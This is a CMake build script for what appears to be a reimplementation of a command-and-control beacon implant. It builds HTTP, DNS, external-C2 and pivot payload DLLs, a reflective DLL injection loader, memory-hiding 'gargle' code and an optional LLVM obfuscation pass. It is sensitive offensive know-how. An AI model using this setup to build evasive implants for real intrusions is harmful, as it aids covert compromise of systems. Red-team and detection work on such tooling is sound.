# Beacon user-mode product — standard CMake project.
#
#   cmake --preset default
#   cmake --build --preset default
#   ctest --preset default -R host_unit
#
# LLVM clang-cl + xwin:
#   cmake --preset llvm [-DBEACON_OBF=ON -DLLVM_DIR=...]
#   cmake --build --preset llvm
cmake_minimum_required(VERSION 3.21)
set(CMAKE_MSVC_RUNTIME_LIBRARY "MultiThreaded$<$<CONFIG:Debug>:Debug>")
set(CMAKE_EXPORT_COMPILE_COMMANDS ON)
project(beacon
  VERSION 4.9.1
  DESCRIPTION "Beacon user-mode product"
  LANGUAGES C CXX)

option(BEACON_LLVM "clang-cl + xwin LLVM line (set by the xwin toolchain)" OFF)
option(BEACON_OBF "Host-build tools/llvm/pass via ExternalProject" OFF)
if(CMAKE_CXX_COMPILER_ID STREQUAL "Clang" AND CMAKE_CXX_COMPILER_FRONTEND_VARIANT STREQUAL "MSVC")
  set(BEACON_LLVM ON)
endif()

if(NOT WIN32)
  message(FATAL_ERROR
    "Target is Windows. For LLVM cross from Linux, use cmake --preset llvm")
endif()

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CXX_EXTENSIONS OFF)
set(CMAKE_INTERPROCEDURAL_OPTIMIZATION OFF)

set(BEACON_OUT "${CMAKE_BINARY_DIR}/out")
set(CMAKE_RUNTIME_OUTPUT_DIRECTORY "${BEACON_OUT}")
set(CMAKE_LIBRARY_OUTPUT_DIRECTORY "${BEACON_OUT}")
set(CMAKE_ARCHIVE_OUTPUT_DIRECTORY "${BEACON_OUT}")
foreach(_cfg DEBUG RELEASE RELWITHDEBINFO MINSIZEREL)
  set(CMAKE_RUNTIME_OUTPUT_DIRECTORY_${_cfg} "${BEACON_OUT}")
  set(CMAKE_LIBRARY_OUTPUT_DIRECTORY_${_cfg} "${BEACON_OUT}")
  set(CMAKE_ARCHIVE_OUTPUT_DIRECTORY_${_cfg} "${BEACON_OUT}")
endforeach()

include("${CMAKE_SOURCE_DIR}/cmake/sources.cmake")

set_source_files_properties(src/channel_doh.c PROPERTIES LANGUAGE CXX)
set_source_files_properties(${INTERPRETER_C_SOURCES} PROPERTIES
  LANGUAGE C
  COMPILE_DEFINITIONS BI_NO_STDIO)

# NDEBUG is NOT listed: CMake injects it for Release/MinSizeRel.
set(BEACON_COMMON_DEFS
  WIN32_LEAN_AND_MEAN
  _CRT_SECURE_NO_WARNINGS
  WIN64
  WIN_X64
  _WINDOWS
  _USRDLL
  REFLECTIVE_DLL_EXPORTS
  REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
  REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN
  LTM_DESC
  USE_LTM
)
if("NDEBUG" IN_LIST BEACON_COMMON_DEFS)
  message(FATAL_ERROR "NDEBUG must not be an unconditional product def")
endif()

set(BEACON_SYS_LIBS
  kernel32 user32 gdi32 advapi32 shell32 ole32 oleaut32 uuid
  ws2_32 wininet dnsapi winhttp
)

set(BEACON_LIB_DIR "${CMAKE_SOURCE_DIR}/lib" CACHE PATH
  "Directory with tomcrypt.x64.lib / tommath.x64.lib (tests may override)")
set(BEACON_TEST_EXTRA_DEFS "" CACHE STRING
  "Extra preprocessor defs for beacon_tests (e.g. BEACON_TEST_ENABLE_KEYGEN)")
set(XWIN_DIR "${XWIN_DIR}" CACHE PATH "xwin splat (LLVM line)")
set(BEACON_OBF_SEED "1337" CACHE STRING "OBF_SEED for the mutation pass")
set(LLD_LINK "${LLD_LINK}" CACHE FILEPATH "lld-link (LLVM line)")
set(LLVM_DIR "${LLVM_DIR}" CACHE PATH "LLVM CMake package dir for BEACON_OBF")

add_library(tomcrypt STATIC IMPORTED GLOBAL)
set_target_properties(tomcrypt PROPERTIES
  IMPORTED_LOCATION "${CMAKE_SOURCE_DIR}/lib/tomcrypt.x64.lib"
  INTERFACE_INCLUDE_DIRECTORIES "${CMAKE_SOURCE_DIR}/tomcrypt-headers")
add_library(tommath STATIC IMPORTED GLOBAL)
set_target_properties(tommath PROPERTIES
  IMPORTED_LOCATION "${CMAKE_SOURCE_DIR}/lib/tommath.x64.lib")
if(NOT EXISTS "${CMAKE_SOURCE_DIR}/lib/tomcrypt.x64.lib" OR
   NOT EXISTS "${CMAKE_SOURCE_DIR}/lib/tommath.x64.lib")
  message(FATAL_ERROR "Vendored libs missing under lib/")
endif()

add_library(tomcrypt_test STATIC IMPORTED GLOBAL)
set_target_properties(tomcrypt_test PROPERTIES
  IMPORTED_LOCATION "${BEACON_LIB_DIR}/tomcrypt.x64.lib"
  INTERFACE_INCLUDE_DIRECTORIES "${CMAKE_SOURCE_DIR}/tomcrypt-headers")
add_library(tommath_test STATIC IMPORTED GLOBAL)
set_target_properties(tommath_test PROPERTIES
  IMPORTED_LOCATION "${BEACON_LIB_DIR}/tommath.x64.lib")
if(NOT EXISTS "${BEACON_LIB_DIR}/tomcrypt.x64.lib" OR
   NOT EXISTS "${BEACON_LIB_DIR}/tommath.x64.lib")
  message(FATAL_ERROR "Test libs missing under BEACON_LIB_DIR=${BEACON_LIB_DIR}")
endif()

set(_obf_plugin "")
if(BEACON_OBF)
  if(NOT LLVM_DIR)
    message(FATAL_ERROR "BEACON_OBF=ON requires -DLLVM_DIR=<llvm>/lib/cmake/llvm")
  endif()
  include(ExternalProject)
  if(CMAKE_HOST_WIN32)
    set(_obf_mod obfpasses.dll)
  else()
    set(_obf_mod obfpasses.so)
  endif()
  set(_obf_plugin "${CMAKE_BINARY_DIR}/obfpasses/${_obf_mod}")
  ExternalProject_Add(obfpasses_ext
    SOURCE_DIR "${CMAKE_SOURCE_DIR}/tools/llvm/pass"
    BINARY_DIR "${CMAKE_BINARY_DIR}/obfpasses"
    CMAKE_ARGS
      -DCMAKE_BUILD_TYPE=Release
      -DLLVM_DIR=${LLVM_DIR}
      -DCMAKE_TOOLCHAIN_FILE=${CMAKE_SOURCE_DIR}/cmake/toolchain-host.cmake
    INSTALL_COMMAND ""
    BUILD_BYPRODUCTS "${_obf_plugin}"
  )
  message(STATUS "BEACON_OBF=ON host pass -> ${_obf_plugin}")
endif()

if(BEACON_LLVM)
  find_package(Python3 REQUIRED COMPONENTS Interpreter)
  if(NOT LLD_LINK)
    if(CMAKE_LINKER)
      set(LLD_LINK "${CMAKE_LINKER}")
    else()
      set(LLD_LINK "lld-link")
    endif()
  endif()
  message(STATUS "BEACON_LLVM=ON cc=${CMAKE_CXX_COMPILER} link=${LLD_LINK} xwin=${XWIN_DIR}")
endif()

function(beacon_set_compile tgt extra_defs layout_inc)
  target_include_directories(${tgt} PRIVATE
    "${CMAKE_SOURCE_DIR}/src"
    "${CMAKE_SOURCE_DIR}/tomcrypt-headers")
  if(layout_inc)
    target_include_directories(${tgt} PRIVATE "${layout_inc}")
    target_compile_definitions(${tgt} PRIVATE BW_LLVM_LAYOUT)
  endif()
  target_compile_definitions(${tgt} PRIVATE
    ${BEACON_COMMON_DEFS}
    ${extra_defs})
  target_compile_options(${tgt} PRIVATE
    /W3 /O1 /Ob1 /Os /Oi /GF /Gy /GS- /nologo
    $<$<COMPILE_LANGUAGE:CXX>:/GR- /std:c++17>)
  if(_obf_plugin)
    target_compile_options(${tgt} PRIVATE
      "SHELL:/clang:-fpass-plugin=${_obf_plugin}")
    add_dependencies(${tgt} obfpasses_ext)
  endif()
endfunction()

function(beacon_set_link tgt output_name)
  target_link_directories(${tgt} PRIVATE "${CMAKE_SOURCE_DIR}")
  if(BEACON_LLVM AND XWIN_DIR)
    target_link_directories(${tgt} PRIVATE
      "${XWIN_DIR}/crt/lib/x86_64"
      "${XWIN_DIR}/sdk/lib/um/x86_64"
      "${XWIN_DIR}/sdk/lib/ucrt/x86_64")
  endif()
  target_link_libraries(${tgt} PRIVATE
    ${BEACON_SYS_LIBS}
    tomcrypt
    tommath)
  set(_link_opts
    /NOLOGO /MACHINE:X64 /SUBSYSTEM:WINDOWS /OPT:REF /OPT:ICF /INCREMENTAL:NO
    /MAP:${BEACON_OUT}/${output_name}.map)
  if(BEACON_LLVM)
    list(APPEND _link_opts /Brepro)
  endif()
  target_link_options(${tgt} PRIVATE ${_link_opts})
  set_target_properties(${tgt} PROPERTIES
    OUTPUT_NAME "${output_name}"
    PREFIX ""
    SUFFIX ".dll"
    LINKER_LANGUAGE CXX)
endfunction()

function(add_beacon_dll target_name output_name sources extra_defs)
  set(_gargle "")
  set(_rest "")
  foreach(_s ${${sources}})
    if(_s MATCHES "gargle")
      list(APPEND _gargle "${_s}")
    else()
      list(APPEND _rest "${_s}")
    endif()
  endforeach()

  if(BEACON_LLVM)
    set(_layout_dir "${CMAKE_BINARY_DIR}/layout/${target_name}")
    file(MAKE_DIRECTORY "${_layout_dir}/stub")
    configure_file(
      "${CMAKE_SOURCE_DIR}/cmake/layout_stub.h"
      "${_layout_dir}/stub/layout.h"
      COPYONLY)

    add_library(${target_name}_rest OBJECT ${_rest})
    beacon_set_compile(${target_name}_rest "${extra_defs}" "")

    add_library(${target_name}_g1 OBJECT ${_gargle})
    beacon_set_compile(${target_name}_g1 "${extra_defs}" "${_layout_dir}/stub")

    add_library(${target_name}_p1 SHARED
      $<TARGET_OBJECTS:${target_name}_rest>
      $<TARGET_OBJECTS:${target_name}_g1>)
    beacon_set_link(${target_name}_p1 "${output_name}.p1")
    set_target_properties(${target_name}_p1 PROPERTIES
      RUNTIME_OUTPUT_DIRECTORY "${_layout_dir}"
      LIBRARY_OUTPUT_DIRECTORY "${_layout_dir}"
      ARCHIVE_OUTPUT_DIRECTORY "${_layout_dir}")

    add_custom_command(
      OUTPUT "${_layout_dir}/layout.h"
      COMMAND ${Python3_EXECUTABLE} "${CMAKE_SOURCE_DIR}/tools/llvm/apply_layout.py"
              --write-only
              --dll "$<TARGET_FILE:${target_name}_p1>"
              --layout "${_layout_dir}/layout.h"
      DEPENDS ${target_name}_p1 "${CMAKE_SOURCE_DIR}/tools/llvm/apply_layout.py"
      COMMENT "Generate layout.h for ${target_name}"
      VERBATIM)
    add_custom_target(${target_name}_layout DEPENDS "${_layout_dir}/layout.h")

    add_library(${target_name}_g2 OBJECT ${_gargle} "${_layout_dir}/layout.h")
    set_source_files_properties("${_layout_dir}/layout.h" PROPERTIES HEADER_FILE_ONLY TRUE)
    beacon_set_compile(${target_name}_g2 "${extra_defs}" "${_layout_dir}")
    add_dependencies(${target_name}_g2 ${target_name}_layout)

    add_library(${target_name}_p2 SHARED
      $<TARGET_OBJECTS:${target_name}_rest>
      $<TARGET_OBJECTS:${target_name}_g2>)
    beacon_set_link(${target_name}_p2 "${output_name}.p2")
    set_target_properties(${target_name}_p2 PROPERTIES
      RUNTIME_OUTPUT_DIRECTORY "${_layout_dir}"
      LIBRARY_OUTPUT_DIRECTORY "${_layout_dir}"
      ARCHIVE_OUTPUT_DIRECTORY "${_layout_dir}")

    file(MAKE_DIRECTORY "${_layout_dir}/p2")
    add_custom_command(
      OUTPUT "${_layout_dir}/p2/layout.h"
      COMMAND ${Python3_EXECUTABLE} "${CMAKE_SOURCE_DIR}/tools/llvm/apply_layout.py"
              --write-only
              --dll "$<TARGET_FILE:${target_name}_p2>"
              --layout "${_layout_dir}/p2/layout.h"
      DEPENDS ${target_name}_p2 "${CMAKE_SOURCE_DIR}/tools/llvm/apply_layout.py"
      COMMENT "Generate layout.h pass-2 for ${target_name}"
      VERBATIM)
    add_custom_target(${target_name}_layout2 DEPENDS "${_layout_dir}/p2/layout.h")

    add_library(${target_name}_g3 OBJECT ${_gargle} "${_layout_dir}/p2/layout.h")
    set_source_files_properties("${_layout_dir}/p2/layout.h" PROPERTIES HEADER_FILE_ONLY TRUE)
    beacon_set_compile(${target_name}_g3 "${extra_defs}" "${_layout_dir}/p2")
    add_dependencies(${target_name}_g3 ${target_name}_layout2)

    add_library(${target_name} SHARED
      $<TARGET_OBJECTS:${target_name}_rest>
      $<TARGET_OBJECTS:${target_name}_g3>)
    beacon_set_link(${target_name} "${output_name}")

    add_custom_command(
      OUTPUT "${_layout_dir}/layout.verified"
      COMMAND ${Python3_EXECUTABLE} "${CMAKE_SOURCE_DIR}/tools/llvm/apply_layout.py"
              --verify
              --dll "$<TARGET_FILE:${target_name}>"
              --layout "${_layout_dir}/p2/layout.h"
      COMMAND ${CMAKE_COMMAND} -E touch "${_layout_dir}/layout.verified"
      DEPENDS ${target_name} "${_layout_dir}/p2/layout.h"
      COMMENT "Verify layout ${target_name}"
      VERBATIM)
    add_custom_target(${target_name}_verified ALL
      DEPENDS "${_layout_dir}/layout.verified")
  else()
    add_library(${target_name} SHARED ${${sources}})
    beacon_set_compile(${target_name} "${extra_defs}" "")
    beacon_set_link(${target_name} "${output_name}")
  endif()
endfunction()

add_beacon_dll(beacon_wininet beacon.x64 BEACON_WININET_SOURCES "BW_LOADER_PRIVATE;BEACON_TIER3")
add_beacon_dll(beacon_winhttp winhttpb.x64 BEACON_WINHTTP_SOURCES "BW_LOADER_PRIVATE;BEACON_TIER3")
# bofwin variant: same wininet beacon with the BOF window compiled in
# (BOFWIN_ENABLE) - this is the build the sleeve beacon.x64.rl0k slot
# carries (MSVC build.yml's BeaconBofWin=true job). Output name matches
# the slot so the llvm-linux artifact drops beacon.x64.rl0k.dll.
add_beacon_dll(beacon_wininet_bofwin beacon.x64.rl0k BEACON_WININET_SOURCES "BW_LOADER_PRIVATE;BEACON_TIER3;BOFWIN_ENABLE")
add_beacon_dll(dnsb           dnsb.x64     DNSB_SOURCES          "BOFWIN_DISABLE")
add_beacon_dll(extc2          extc2.x64    EXTC2_SOURCES         "BOFWIN_DISABLE")
add_beacon_dll(pivot          pivot.x64    PIVOT_SOURCES         "BOFWIN_DISABLE")

add_executable(beacon_tests
  tests/test_main.cpp
  tests/test_parse.cpp
  tests/test_bformat.cpp
  tests/test_settings.cpp
  tests/test_guardrails.cpp
  tests/test_datastore.cpp
  tests/test_syscalls.cpp
  tests/test_s4.cpp
  tests/test_crypto.cpp
  tests/test_miniprintf.cpp
  tests/test_keygen.cpp
  src/parse.cpp
  src/bformat.cpp
  src/settings.cpp
  src/datastore.cpp
  src/hostprof.cpp
  src/syscalls.cpp
  src/track_memory.cpp
  src/security.cpp
  src/crypto.cpp
  src/miniprintf.cpp)
target_include_directories(beacon_tests PRIVATE
  "${CMAKE_SOURCE_DIR}/src"
  "${CMAKE_SOURCE_DIR}/tomcrypt-headers"
  "${CMAKE_SOURCE_DIR}/tests")
target_compile_definitions(beacon_tests PRIVATE
  _CRT_SECURE_NO_WARNINGS
  WIN32_LEAN_AND_MEAN
  LTM_DESC
  USE_LTM
  BW_TRACE_ENABLE)
target_compile_options(beacon_tests PRIVATE /W3 /EHsc)
target_link_libraries(beacon_tests PRIVATE
  ws2_32 advapi32
  tomcrypt_test tommath_test)
if(BEACON_TEST_EXTRA_DEFS)
  target_compile_definitions(beacon_tests PRIVATE ${BEACON_TEST_EXTRA_DEFS})
endif()
set_target_properties(beacon_tests PROPERTIES OUTPUT_NAME tests)

add_executable(load_smoke tests/load_smoke.cpp)
target_compile_options(load_smoke PRIVATE /W3 /EHsc)
target_link_libraries(load_smoke PRIVATE kernel32)
add_dependencies(load_smoke beacon_wininet)

function(add_udrl_obj target_name extra_defs)
  add_library(${target_name} OBJECT udrl/ReflectiveLoader.c)
  target_include_directories(${target_name} PRIVATE
    "${CMAKE_SOURCE_DIR}/udrl" "${CMAKE_SOURCE_DIR}/src")
  target_compile_definitions(${target_name} PRIVATE
    BW_UDRL_USER_DATA_DELIVER=1 BW_LOADER_PRIVATE=1 ${extra_defs})
  target_compile_options(${target_name} PRIVATE /W3 /O2 /GS- /Zl /Gy- /nologo)
endfunction()
add_udrl_obj(udrl     "")
add_udrl_obj(udrl_rwx "BW_DIAG_RWX")

add_custom_target(udrl_export ALL
  COMMAND ${CMAKE_COMMAND} -E make_directory "${BEACON_OUT}"
  COMMAND ${CMAKE_COMMAND} -E copy_if_different
          "$<TARGET_OBJECTS:udrl>"
          "${BEACON_OUT}/ReflectiveLoader.x64.obj"
  COMMAND ${CMAKE_COMMAND} -E copy_if_different
          "$<TARGET_OBJECTS:udrl_rwx>"
          "${BEACON_OUT}/ReflectiveLoader.rwx.x64.obj"
  DEPENDS udrl udrl_rwx
  COMMENT "export UDRL COFF objects"
  VERBATIM)

add_executable(host_template WIN32 udrl/hostexe.c)
target_compile_options(host_template PRIVATE /W3 /O1 /GS- /nologo)
target_link_libraries(host_template PRIVATE kernel32)
target_link_options(host_template PRIVATE
  /NOLOGO /ENTRY:bw_entry /MACHINE:X64 /STACK:16777216 /DYNAMICBASE /NXCOMPAT)
set_target_properties(host_template PROPERTIES OUTPUT_NAME host_template_x64)

find_program(BEACON_PWSH NAMES pwsh powershell)
add_custom_target(trimlib
  COMMAND "${BEACON_PWSH}" -NoProfile -File "${CMAKE_SOURCE_DIR}/thirdparty/build_trimmed.ps1"
  WORKING_DIRECTORY "${CMAKE_SOURCE_DIR}"
  COMMENT "Rebuild trimmed TomCrypt into thirdparty/out (network)"
  VERBATIM)
add_custom_target(trimlib-test
  COMMAND "${CMAKE_COMMAND}" -E echo
          "After trimlib: cmake --preset default -DBEACON_LIB_DIR=thirdparty/out -DBEACON_TEST_EXTRA_DEFS=BEACON_TEST_ENABLE_KEYGEN && cmake --build --preset default --target beacon_tests && ctest --preset default -R host_unit"
  DEPENDS trimlib
  VERBATIM)

install(TARGETS
  beacon_wininet beacon_winhttp beacon_wininet_bofwin dnsb extc2 pivot
  beacon_tests load_smoke host_template
  RUNTIME DESTINATION bin
  LIBRARY DESTINATION bin
  ARCHIVE DESTINATION lib)
install(FILES
  "${BEACON_OUT}/ReflectiveLoader.x64.obj"
  "${BEACON_OUT}/ReflectiveLoader.rwx.x64.obj"
  DESTINATION lib)

get_target_property(_prod_libs beacon_wininet LINK_LIBRARIES)
set(_has_tomcrypt 0)
if("tomcrypt" IN_LIST _prod_libs)
  set(_has_tomcrypt 1)
endif()
get_target_property(_test_libs beacon_tests LINK_LIBRARIES)
set(_has_tomcrypt_test 0)
if("tomcrypt_test" IN_LIST _test_libs)
  set(_has_tomcrypt_test 1)
endif()
if(NOT _has_tomcrypt OR NOT _has_tomcrypt_test)
  message(FATAL_ERROR "product/tests must target_link_libraries IMPORTED tomcrypt")
endif()
file(WRITE "${CMAKE_BINARY_DIR}/contract_stamp.txt"
  "tomcrypt_imported=1\nNDEBUG_unconditional=0\n")

enable_testing()
if(NOT CMAKE_CROSSCOMPILING)
  add_test(NAME host_unit COMMAND beacon_tests)
  add_test(NAME load_smoke_wininet COMMAND load_smoke "$<TARGET_FILE:beacon_wininet>")
  set_tests_properties(load_smoke_wininet PROPERTIES
    DEPENDS host_unit
    SKIP_RETURN_CODE 125)
  set(_prefix "${CMAKE_BINARY_DIR}/contract-prefix")
  add_test(NAME cmake_install
    COMMAND ${CMAKE_COMMAND} --install "${CMAKE_BINARY_DIR}"
            --config Release --prefix "${_prefix}")
  add_test(NAME cmake_contract
    COMMAND ${CMAKE_COMMAND}
            -DPREFIX=${_prefix}
            -DCONTRACT_STAMP=${CMAKE_BINARY_DIR}/contract_stamp.txt
            -P "${CMAKE_SOURCE_DIR}/cmake/contract_check.cmake")
  set_tests_properties(cmake_install PROPERTIES FIXTURES_SETUP install_prefix)
  set_tests_properties(cmake_contract PROPERTIES FIXTURES_REQUIRED install_prefix)
endif()
